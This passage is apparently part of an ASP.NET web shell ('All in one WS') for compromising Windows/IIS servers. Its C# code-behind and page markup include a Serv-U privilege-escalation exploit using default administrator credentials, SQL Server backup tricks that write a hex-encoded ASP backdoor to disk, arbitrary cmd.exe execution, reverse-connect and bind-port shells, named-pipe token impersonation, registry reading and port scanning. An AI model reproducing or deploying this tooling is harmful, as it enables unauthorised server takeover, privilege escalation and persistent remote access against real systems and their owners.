                string exesql = "use pubs;if exists (select * from sysobjects where id = object_id(N'[K_dir]') and OBJECTPROPERTY(id, N'IsUserTable') = 1) drop table [K_dir]; CREATE TABLE K_dir(DirName VARCHAR(400), DirAtt VARCHAR(400),DirFile VARCHAR(400)) INSERT K_dir EXEC MASTER..XP_dirtree '" + K_DirTextBox.Text + "',1,1;";
            K_ExecSql(exesql);
                DataTable sql_dir = K_DataTable("select * from K_dir");
            K_DataGrid.DataSource = sql_dir;
            K_DataGrid.DataBind();
        }
        catch (Exception e)
        {
            K_Error(e.Message);
        }
    }
    
        protected void K_SuButton_Click(object sender, EventArgs e)
    {
        K_commPanel.Visible = false;
        K_SQLPanel.Visible = false;
        K_SuPanel.Visible = true;
        K_IISPanel.Visible = false;
        K_SuresLabel.Text = "";
        K_LoginPanel.Visible = false;
        K_RegPanel.Visible = false;
        K_PortPanel.Visible = false;
        K_InteractivePanel.Visible = false;
    }
    
        protected void K_dbshellButton_Click(object sender, EventArgs e)
    {
        K_DBinfoLabel.Visible = false;
        K_AccPanel.Visible = false;
        K_BakDB();
    }
        public void K_BakDB()
    {
            string path = K_DirTextBox.Text.Trim();
        if (path.Substring(path.Length - 1, 1) == @"\")
        {
            path = path + "bin.asp";
        }
            else
        {
            path = path + @"\bin.asp";
        }
            string sql = "if exists (select * from sysobjects where id = object_id(N'[K_comm]') and OBJECTPROPERTY(id, N'IsUserTable') = 1) drop table [K_comm];create table [K_comm] ([comm] [image]);declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x62696E backup database @a to disk = @s;insert into [K_comm](comm) values(0x3C256578656375746520726571756573742822422229253E);declare @b sysname,@t nvarchar(4000) select @b=db_name(),@t='" + path + "' backup database @b to disk = @t WITH DIFFERENTIAL,FORMAT;drop table [K_comm];";
        K_ExecSql(sql);
        K_SqlDir();
    }
        public void K_BakLog()
    {
            string path = K_DirTextBox.Text.Trim();
        if (path.Substring(path.Length - 1, 1) == @"\")
        {
            path = path + "bin.asp";
        }
            else
        {
            path = path + @"\bin.asp";
        }
            string sql = "if exists (select * from sysobjects where id = object_id(N'[K_comm]') and OBJECTPROPERTY(id, N'IsUserTable') = 1) drop table [K_comm];create table [K_comm] ([comm] [image]);declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x62696E backup log @a to disk = @s;insert into [K_comm](comm) values(0x3C256578656375746520726571756573742822422229253E);declare @b sysname,@t nvarchar(4000) select @b=db_name(),@t='" + path + "' backup log @b to disk=@t with init,no_truncate;drop table [K_comm];";
        K_ExecSql(sql);
        K_SqlDir();
    }
    
        protected void K_LogshellButton_Click(object sender, EventArgs e)
    {
        K_DBinfoLabel.Visible = false;
        K_AccPanel.Visible = false;
        K_BakLog();
    }
    
        protected void K_SuexpButton_Click(object sender, EventArgs e)
    {
            string Result = "";
            string user = K_SunameTextBox.Text;
            string pass = K_SupassTextBox.Text;
            int port = Int32.Parse(K_SuportTextBox.Text);
            string comm = K_SucommTextBox.Text;
            string loginuser = "user " + user + "\r\n";
            string loginpass = "pass " + pass + "\r\n";
            string site = "SITE MAINTENANCE\r\n";
            string deldomain = "-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
            string setdomain = "-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
            string newdomain = "-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
            string quite = "QUIT\r\n";
        try {
                TcpClient tcp = new TcpClient("127.0.0.1", port);
            tcp.ReceiveBufferSize = 1024;
                NetworkStream NS = tcp.GetStream();
            Result = Rev(NS);
            Result += Send(NS, loginuser);
            Result += Rev(NS);
            Result += Send(NS, loginpass);
            Result += Rev(NS);
            Result += Send(NS, site);
            Result += Rev(NS);
            Result += Send(NS, deldomain);
            Result += Rev(NS);
            Result += Send(NS, setdomain);
            Result += Rev(NS);
            Result += Send(NS, newdomain);
            Result += Rev(NS);
                TcpClient tcp1 = new TcpClient("127.0.0.1", 52521);
                NetworkStream NS1 = tcp1.GetStream();
            Result += Rev(NS1);
            Result += Send(NS1, "user bin\r\n");
            Result += Rev(NS1);
            Result += Send(NS1, "pass binftp\r\n");
            Result += Rev(NS1);
            Result += Send(NS1, "site exec " + comm + "\r\n");
            Result += Rev(NS1);
            tcp1.Close();
            Result += Send(NS, deldomain);
            Result += Rev(NS);
            Result += Send(NS, quite);
            Result += Rev(NS);
            tcp.Close();
        }
        catch (Exception error)
        {
            K_Error(error.Message);
        }
        K_SuresLabel.Text = "<div id=\"su\"><pre>" + Result + "</pre></div>";


    }
        protected string Rev(NetworkStream instream)
    {
            string Restr = "";
        if (instream.CanRead) {
            byte[] buffer = new byte[1024];
            instream.Read(buffer, 0, buffer.Length);
            Restr = Encoding.ASCII.GetString(buffer);
        }
        return "<font color = red>" + Restr + "</font><br>";

    }
        protected string Send(NetworkStream instream, string Sendstr)
    {
        if (instream.CanWrite) {
            byte[] buffer = Encoding.ASCII.GetBytes(Sendstr);
            instream.Write(buffer, 0, buffer.Length);
        }
        return "<font color = blue>" + Sendstr + "</font><br>";
    }
        protected void K_IISButton_Click(object sender, EventArgs e)
    {
        K_LoginPanel.Visible = false;
        K_MainPanel.Visible = false;
        K_MenuPanel.Visible = true;
        K_FilePanel.Visible = false;
        K_commPanel.Visible = false;
        K_SQLPanel.Visible = false;
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = true;
        K_RegPanel.Visible = false;
        K_PortPanel.Visible = false;
        K_iisLabel.Text = K_iisinfo();
        K_InteractivePanel.Visible = false;

    }
    
        protected void K_PortButton_Click(object sender, EventArgs e)
    {
        K_MenuPanel.Visible = true;
        K_LoginPanel.Visible = false;
        K_commPanel.Visible = false;
        K_SQLPanel.Visible = false;
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = false;
        K_RegPanel.Visible = false;
        K_PortPanel.Visible = true;
        K_ScanresLabel.Text = "";
        K_InteractivePanel.Visible = false;
    }
    
        protected void K_RegButton_Click(object sender, EventArgs e)
    {
        K_MenuPanel.Visible = true;
        K_LoginPanel.Visible = false;
        K_commPanel.Visible = false;
        K_SQLPanel.Visible = false;
        K_SuPanel.Visible = false;
        K_IISPanel.Visible = false;
        K_RegPanel.Visible = true;
        K_PortPanel.Visible = false;
        K_RegresLabel.Text = "";
        K_InteractivePanel.Visible = false;

    }
    
        protected void K_RegreadButton_Click(object sender, EventArgs e)
    {
        try {
                string regkey = K_KeyTextBox.Text;
                string subkey = regkey.Substring(regkey.IndexOf("\\") + 1, regkey.Length - regkey.IndexOf("\\") - 1);
                RegistryKey rk = null;
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_LOCAL_MACHINE") {
                rk = Registry.LocalMachine.OpenSubKey(subkey);
            }
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_CLASSES_ROOT") {
                rk = Registry.ClassesRoot.OpenSubKey(subkey);
            }
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_CURRENT_USER") {
                rk = Registry.CurrentUser.OpenSubKey(subkey);
            }
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_USERS") {
                rk = Registry.Users.OpenSubKey(subkey);
            }
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_CURRENT_CONFIG") {
                rk = Registry.CurrentConfig.OpenSubKey(subkey);
            }

            K_RegresLabel.Text = "<br>Result : " + rk.GetValue(K_ValueTextBox.Text, "NULL").ToString();
        }
        catch (Exception error)
        {
            K_Error(error.Message);
        }
    }
    
        protected void K_ScancommButton_Click(object sender, EventArgs e)
    {
        try {
                string res = "";
            string[] port = K_PortsTextBox.Text.Split(',');
            for (int i = 0; i < port.Length; i++)
            {
                res += K_Scan(K_ScanipTextBox.Text, Int32.Parse(port[i])) + "<br>";
            }
            K_ScanresLabel.Text = "<hr>" + res;
        }
        catch (Exception error)
        {
            K_Error(error.Message);
        }
    }
        protected string K_Scan(string ip, int port)
    {
            
            string scanres = "";
            TcpClient tcp = new TcpClient();
        tcp.SendTimeout = tcp.ReceiveTimeout = 2000;
        try {
            tcp.Connect(ip, port);
            tcp.Close();
            scanres = ip + " : " + port + " ................................. <font color=green><b>Open</b></font>";
        }
        catch (SocketException e)
        {
            scanres = ip + " : " + port + " ................................. <font color=red><b>Close</b></font>";
        }
        return scanres;
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">

<head runat="server">
    <title>All in one WS</title>
    <style type="text/css">
        A:link {
            COLOR: #000000;
            TEXT-DECORATION: None
        }

        A:visited {
            COLOR: #000000;
            TEXT-DECORATION: None
        }

        A:active {
            COLOR: #000000;
            TEXT-DECORATION: None
        }

        A:hover {
            COLOR: #000000;
            TEXT-DECORATION: underline
        }

        BODY {
            FONT-SIZE: 9pt;
            FONT-FAMILY: "Courier New";
        }

        #nei {
            width: 500px;
            margin: 0px auto;

            overflow: hidden
        }

        #su {
            width: 300px;
            margin: 0px auto;

            overflow: hidden
        }

        #comm {
            width: 500px;
            margin: 0px auto;

            overflow: hidden
        }
    </style>
    <script type="text/javascript" language="javascript">
        function Command(comm, str) {
            var strTmp = str;
            var myFrm = document.forms[0];
            if (comm == 'del') {
                if (confirm('Del It ?')) {
                    myFrm.todo.value = str;
                    myFrm.goaction.value = comm;
                    myFrm.submit();
                }
                else return;
            }
            if (comm == 'change') {
                myFrm.todo.value = str;
                myFrm.goaction.value = comm;
                myFrm.submit();
            }
            if (comm == 'down') {
                myFrm.todo.value = str;
                myFrm.goaction.value = comm;
                myFrm.submit();
            }
            if (comm == 'showatt') {
                myFrm.todo.value = str;
                myFrm.goaction.value = comm;
                myFrm.submit();
            }
            if (comm == 'edit') {
                myFrm.todo.value = str;
                myFrm.goaction.value = comm;
                myFrm.submit();
            }
            if (comm == 'deldir') {
                if (confirm('Del It ?')) {
                    myFrm.todo.value = str;
                    myFrm.goaction.value = comm;
                    myFrm.submit();
                }
                else return;
            }
            if (comm == 'rename') {
                myFrm.goaction.value = comm;
                myFrm.todo.value = str + ',';
                str = prompt('Please input new filename:', strTmp);
                if (str && (strTmp != str)) {
                    myFrm.todo.value += str;
                    myFrm.submit();
                }
                else return;
            }
            if (comm == 'renamedir') {
                myFrm.goaction.value = comm;
                myFrm.todo.value = str + ',';
                str = prompt('Please input new foldername:', strTmp);
                if (str && (strTmp != str)) {
                    myFrm.todo.value += str;
                    myFrm.submit();
                }
                else return;
            }
            if (comm == 'postdata') {
                myFrm.todo.value = str.value;
                myFrm.goaction.value = comm;
                myFrm.submit();
            }
            if (comm == 'change_data') {
                myFrm.todo.value = str.value;
                myFrm.intext.value = str.options[str.selectedIndex].innerText
                myFrm.goaction.value = comm;
                myFrm.submit();
            }
        }

    </script>
</head>

<body>
    <form id="form1" runat="server">
        <div style="text-align: left">
            <asp:Panel ID="K_LoginPanel" runat="server" Height="47px" Width="401px">
                <asp:Label ID="PassLabel" runat="server" Text="Password:"></asp:Label>
                <asp:TextBox ID="passtext" runat="server" TextMode="Password" Width="203px"></asp:TextBox>
                <asp:Button ID="LoginButton" runat="server" Text="Enter" OnClick="LoginButton_Click" />
                <p />
               F4ck u the hobbit
            </asp:Panel>
            <div>
                <asp:Panel ID="K_MenuPanel" runat="server">
                    <asp:Label ID="TimeLabel" runat="server" Text="Label" Width="150px"></asp:Label><br />
                    <asp:Button ID="MainButton" runat="server" OnClick="MainButton_Click" Text="Sysinfo" />
                    <asp:Button ID="K_IISButton" runat="server" OnClick="K_IISButton_Click" Text="IISSpy" />
                    <asp:Button ID="FileButton" runat="server" OnClick="FileButton_Click" Text="File Mode" />
                    <asp:Button ID="K_commButton" runat="server" Text="Exec" OnClick="K_commButton_Click" />
                    <asp:Button ID="K_InteractiveButton" runat="server" Text="Interactive mode" OnClick="K_InteractiveButton_Click" />
                    <asp:Button ID="K_SQLButton" runat="server" OnClick="K_SQLButton_Click" Text="SqlTools" />&nbsp;
                    <asp:Button ID="K_SuButton" runat="server" OnClick="K_SuButton_Click" Text="SuExp" />
                    <asp:Button ID="K_PortButton" runat="server" Text="PortScan" OnClick="K_PortButton_Click" />
                    <asp:Button ID="K_RegButton" runat="server" Text="RegShell" OnClick="K_RegButton_Click" />
                    <asp:Button ID="LogoutButton" runat="server" OnClick="LogoutButton_Click" Text="Logout" /><br />
                    <asp:Label ID="K_ErrorLabel" runat="server" EnableViewState="False">F4ck u the hobbit </asp:Label>
                </asp:Panel>
            </div>
            <asp:Panel ID="K_MainPanel" runat="server" Width="769px" EnableViewState="False" Visible="False"
                Height="20px">
                <div style="text-align: left">
                    <asp:Label ID="InfoLabel" runat="server" Width="765px" EnableViewState="False"></asp:Label>
                </div>
            </asp:Panel>
            <div style="text-align: left">
                <asp:Panel ID="K_FilePanel" runat="server" Width="767px" EnableViewState="False" Visible="False">
                    <div style="text-align: left">
                        <asp:Label ID="K_FileLabel" runat="server" Text="Label" Width="764px"></asp:Label><br />
                        <asp:Label ID="K_UpfileLabel" runat="server" Text="Upfile :  "></asp:Label>
                        <input class="TextBox" id="K_UpFile" type="file" name="upfile" runat="server" />&nbsp;
                        <asp:TextBox ID="K_upTextBox" runat="server" Width="339px"></asp:TextBox>&nbsp;
                        <asp:Button ID="K_GoButton" runat="server" OnClick="K_GoButton_Click" Text="GO" />
                        <asp:Button ID="K_upButton" runat="server" Text="UpLoad" OnClick="K_upButton_Click"
                            EnableViewState="False" /><br />
                        <asp:Label ID="K_CreateLabel" runat="server" Text="Create :"></asp:Label>
                        <asp:TextBox ID="K_CreateTextBox" runat="server"></asp:TextBox>
                        <asp:Button ID="K_NewFileButton" runat="server" Text="NewFile"
                            OnClick="K_NewFileButton_Click" />
                        <asp:Button ID="K_NewdirButton" runat="server" Text="NewDir"
                            OnClick="K_NewdirButton_Click" />
                        <br />
                        <asp:Label ID="K_CopyLabel" runat="server" Text="Copy :" Width="39px"></asp:Label>
                        &nbsp;
                        <asp:TextBox ID="K_CopyTextBox" runat="server" Width="273px"></asp:TextBox>
                        <asp:Label ID="K_CopytoLable" runat="server" Text="To:"></asp:Label>
                        <asp:TextBox ID="K_CopytoTextBox" runat="server" Width="268px"></asp:TextBox>
                        <asp:Button ID="K_CopyButton" runat="server" Text="Copy" OnClick="K_CopyButton_Click" />
                        <asp:Button ID="K_CutButton" runat="server" Text="Cut" Width="46px"
                            OnClick="K_CutButton_Click" />
                        <asp:Label ID="K_FilelistLabel" runat="server" EnableViewState="False"></asp:Label>
                    </div>
                    <div style="text-align: center">
                        <asp:Panel ID="K_AttPanel" runat="server" Width="765px" Visible="False">
                            <hr />
                            FileName :
                            <asp:Label ID="K_AttLabel" runat="server" Text="Label"></asp:Label><br />
                            <asp:CheckBox ID="K_ReadOnlyCheckBox" runat="server" Text="ReadOnly" />
                            <asp:CheckBox ID="K_SystemCheckBox" runat="server" Text="System" />
                            <asp:CheckBox ID="K_HiddenCheckBox" runat="server" Text="Hidden" />
                            <asp:CheckBox ID="K_ArchiveCheckBox" runat="server" Text="Archive" />
                            <br />
                            CreationTime :
                            <asp:TextBox ID="K_CreationTimeTextBox" runat="server" Width="123px"></asp:TextBox>
                            LastWriteTime :
                            <asp:TextBox ID="K_LastWriteTimeTextBox" runat="server" Width="129px"></asp:TextBox>
                            LastAccessTime :
                            <asp:TextBox ID="K_AccessTimeTextBox" runat="server" Width="119px"></asp:TextBox><br />
                            <asp:Button ID="K_SetButton" runat="server" OnClick="K_SetButton_Click" Text="Set" />
                            <asp:Button ID="K_SbackButton" runat="server" OnClick="K_SbackButton_Click"
                                Text="Back" />
                            <hr />
                        </asp:Panel>
                    </div>
                    <div style="text-align: center">
                        <asp:Panel ID="K_EditPanel" runat="server" Visible="False">
                            <hr style="width: 757px" />
                            Path:<asp:TextBox ID="K_EditpathTextBox" runat="server" Width="455px"></asp:TextBox><br />
                            <asp:TextBox ID="K_EditTextBox" runat="server" TextMode="MultiLine" Columns="100"
                                Rows="25" Width="760px"></asp:TextBox><br />
                            <asp:Button ID="K_EditButton" runat="server" Text="Submit"
                                OnClick="K_EditButton_Click" />
                            &nbsp;
                            <asp:Button ID="K_BackButton" runat="server" OnClick="K_BackButton_Click" Text="Back" />
                        </asp:Panel>
                    </div>
                </asp:Panel>
            </div>
            <asp:Panel ID="K_commPanel" runat="server" Height="50px" Width="763px">
                <hr />
                ProgPath : &nbsp;<asp:TextBox ID="K_commPathTextBox" runat="server" Width="395px"> cmd.exe</asp:TextBox><br />
                Args :
                <asp:TextBox ID="K_commShellTextBox" runat="server" Width="395px">/c whoami</asp:TextBox><br />
                <asp:Button ID="K_RunButton" runat="server" OnClick="K_RunButton_Click" Text="Run" />
                <div style="text-align: left">
                    <asp:Label ID="K_commLabel" runat="server" EnableViewState="False"></asp:Label>
                </div>
                <hr />
            </asp:Panel>
            <asp:Panel ID="K_InteractivePanel" runat="server" Height="50px" Width="763px">
                <hr />
                <div>    
                    <asp:Label ID="Label5" runat="server" Height="26px" Text="Current Context" Width="278px" Font-Bold="True">
                    </asp:Label><br />
                
                    <% DisplayCurrentContext();%>
                
                        <br />
                
                        <asp:Label ID="Label1" runat="server" Height="26px" Text="Connection Method:" Width="278px" Font-Bold="True">
                        </asp:Label><br />
                
                        <br />
                
                        <asp:Label ID="Label2" runat="server" Text="Host" Width="198px"></asp:Label>
                
                        <asp:Label ID="Label3" runat="server" Text="Port" Width="101px"></asp:Label><br />
                
                        <asp:TextBox ID="txtRemoteHost" runat="server" Width="191px"></asp:TextBox>
                
                        <asp:TextBox ID="txtRemotePort" runat="server" Width="94px"></asp:TextBox><br />
                
                        <asp:Button ID="K_ConnectBackButton" runat="server" OnClick="K_ConnectBackButton_Click" Text="Reverse seo"
                            Width="302px" /><br />
                
                        <br />
                
                        <asp:Label ID="Port" runat="server" Text="Port" Width="189px"></asp:Label><br />
                
                        <asp:TextBox ID="txtBindPort" runat="server" Width="91px"></asp:TextBox><br />
                
                        <asp:Button ID="K_BindPortButton" runat="server" OnClick="K_BindPortButton_Click" Text="Bind Port" Width="299px" />
                        <br />
                
                        <br />
                
                
                
                        <asp:Label ID="Label7" runat="server" Height="26px" Text="Named Pipe Attck" Width="278px" Font-Bold="True">
                        </asp:Label><br />
                
                        <br />
                
                        <asp:Label ID="Label6" runat="server" Text="Pipe Name" Width="198px"></asp:Label><br />
                
                        <asp:TextBox ID="txtPipeName" runat="server" Text="InsomniaShell" Width="191px"></asp:TextBox><br />
                
                        <asp:Button ID="Button1" runat="server" OnClick="K_CreateNamedPipeButton_Click" Text="Create Named Pipe"
                            Width="400px" /><br />
                
                        <asp:Label ID="Label8" runat="server" Text="SQL User" Width="198px"></asp:Label>
                
                        <asp:Label ID="Label9" runat="server" Text="SQL Pass" Width="101px"></asp:Label><br />
                
                        <asp:TextBox ID="txtSQLUser" runat="server" Width="191px">sa</asp:TextBox>
                
                        <asp:TextBox ID="txtSQLPass" runat="server" Width="94px"></asp:TextBox><br />
                
                        <asp:Button ID="Button3" runat="server" OnClick="K_SQLRequestButton_Click" Text="Make SQL Request" Width="400px" />
                        <br />
                
                        <br />
                
                
                
                        <asp:Label ID="Label4" runat="server" Height="26px" Text="Available SYS/Adm Tokens" Width="400px"
                            Font-Bold="True"></asp:Label><br />
                
                        <br />
                
                        <% DisplayAvailableTokens(); %>
                
                
                
                </div>
                <hr />
            </asp:Panel>
            <asp:Panel ID="K_SQLPanel" runat="server" Visible="False" Width="763px">
                <hr />
                ConnString :
                <asp:TextBox ID="K_SQLconnTextBox" runat="server" Width="547px">
                    server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB</asp:TextBox><br />
                <asp:RadioButton ID="K_SQLRadioButton" runat="server" AutoPostBack="True"
                    OnCheckedChanged="K_SQLRadioButton_CheckedChanged" Text="MS-SQL" Checked="True" />
                <asp:RadioButton ID="K_AccRadioButton" runat="server" AutoPostBack="True"
                    OnCheckedChanged="K_AccRadioButton_CheckedChanged" Text="MS-Access" />
                <asp:Button ID="SQL_SumbitButton" runat="server" Text="Sumbit" OnClick="SQL_SumbitButton_Click" />
                <hr />
                <asp:Panel ID="K_DBmenuPanel" runat="server" Width="759px" Visible="False">
                    <asp:Button ID="K_BDButton" runat="server" Text="DataBase" OnClick="K_BDButton_Click" />
                    <asp:Button ID="K_SAcommButton" runat="server" Text="SA_Exec" OnClick="K_SAcommButton_Click" />
                    <asp:Button ID="K_DirButton" runat="server" Text="SQL_Dir" OnClick="K_DirButton_Click" /><br />
                    <hr />
                    <div style="text-align: left">
                        <asp:Label ID="K_DBinfoLabel" runat="server" Text="Label" EnableViewState="False"></asp:Label>
                    </div>
                </asp:Panel>
                <asp:Panel ID="K_AccPanel" runat="server" Height="50px" Width="759px" EnableViewState="False">
                    <asp:Label ID="K_AccinfoLabel" runat="server" Text="Label" EnableViewState="False"></asp:Label>
                    <br />
                    <asp:TextBox ID="K_DBstrTextBox" runat="server" TextMode="MultiLine" Width="569px"></asp:TextBox>
                    <asp:Button ID="K_ExecButton" runat="server" OnClick="K_ExecButton_Click" Text="Exec" />
                    <asp:Button ID="K_SAexecButton" runat="server" Text="SA_Exec" OnClick="K_SAexecButton_Click" />
                    <br />
                    <div style="text-align:left">
                        <asp:Label ID="K_ResLabel" runat="server"></asp:Label>
                    </div>
                </asp:Panel>
                <asp:Panel ID="K_dirPanel" runat="server" Visible="False" Width="759px">
                    Path :
                    <asp:TextBox ID="K_DirTextBox" runat="server" Width="447px">c:\</asp:TextBox>
                    <br />
                    <asp:Button ID="K_listButton" runat="server" OnClick="K_listButton_Click" Text="Dir" />&nbsp;
                    <asp:Button ID="K_dbshellButton" runat="server" OnClick="K_dbshellButton_Click" Text="Bak_DB" />
                    <asp:Button ID="K_LogshellButton" runat="server" Text="Bak_LOG"
                        OnClick="K_LogshellButton_Click" />
                    <hr />
                </asp:Panel>
                <br /><br />
                <div style="overflow:scroll; text-align:left; width:770px;" id="K_Scroll" runat="server"
                    visible="false">
                    <asp:DataGrid ID="K_DataGrid" runat="server" Width="753px" PageSize="20" CssClass="K_DataGrid"
                        OnItemDataBound="Item_DataBound" AllowPaging="True" OnPageIndexChanged="K_DBPage"
                        OnItemCommand="Item_Command">
                        <PagerStyle Mode="NumericPages" Position="TopAndBottom" />
                    </asp:DataGrid>
                </div>
            </asp:Panel>
            <asp:Panel ID="K_SuPanel" runat="server" Width="763px">
                <hr />
                Name :
                <asp:TextBox ID="K_SunameTextBox" runat="server">localadministrator</asp:TextBox>
                Pass :
                <asp:TextBox ID="K_SupassTextBox" runat="server">#l@$ak#.lk;0@P</asp:TextBox>
                Port :
                <asp:TextBox ID="K_SuportTextBox" runat="server">43958</asp:TextBox><br />
                comm :
                <asp:TextBox ID="K_SucommTextBox" runat="server" Width="447px">comm.exe /c net user</asp:TextBox><br />
                <asp:Button ID="K_SuexpButton" runat="server" Text="Exploit" OnClick="K_SuexpButton_Click" /><br />
                <div style="text-align:left">
                    <hr />
                    <asp:Label ID="K_SuresLabel" runat="server"></asp:Label>
                </div>
            </asp:Panel>
            <asp:Panel ID="K_IISPanel" runat="server" Width="763px">
                <div style="text-align:left">
                    <hr />
                    <asp:Label ID="K_iisLabel" runat="server" Text="Label" EnableViewState="False"></asp:Label>&nbsp;
                </div>
            </asp:Panel>
            <asp:Panel ID="K_RegPanel" runat="server" Width="763px">
                <hr />
                <div style="text-align:left">
                    KEY :&nbsp; &nbsp;<asp:TextBox ID="K_KeyTextBox" runat="server" Width="595px">
                        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName</asp:TextBox>
                    <br />
                    VALUE :
                    <asp:TextBox ID="K_ValueTextBox" runat="server" Width="312px">ComputerName</asp:TextBox>&nbsp;
                    <asp:Button ID="K_RegreadButton" runat="server" Text="Read" OnClick="K_RegreadButton_Click" />
                    <br />
                    <asp:Label ID="K_RegresLabel" runat="server"></asp:Label>
                    <hr />
                </div>
            </asp:Panel>
            <asp:Panel ID="K_PortPanel" runat="server" Width="763px">
                <hr />
                <div style="text-align:left">
                    IP :
                    <asp:TextBox ID="K_ScanipTextBox" runat="server" Width="194px">127.0.0.1</asp:TextBox>
                    PORT :
                    <asp:TextBox ID="K_PortsTextBox" runat="server" Width="356px">
                        21,80,1433,3306,3389,4899,5631,43958,65500</asp:TextBox>
                    <asp:Button ID="K_ScancommButton" runat="server" Text="Scan" OnClick="K_ScancommButton_Click" />
                    <br />
                    <asp:Label ID="K_ScanresLabel" runat="server"></asp:Label>
                </div>
                <hr />
            </asp:Panel>

        </div>
    </form>
</body>

</html>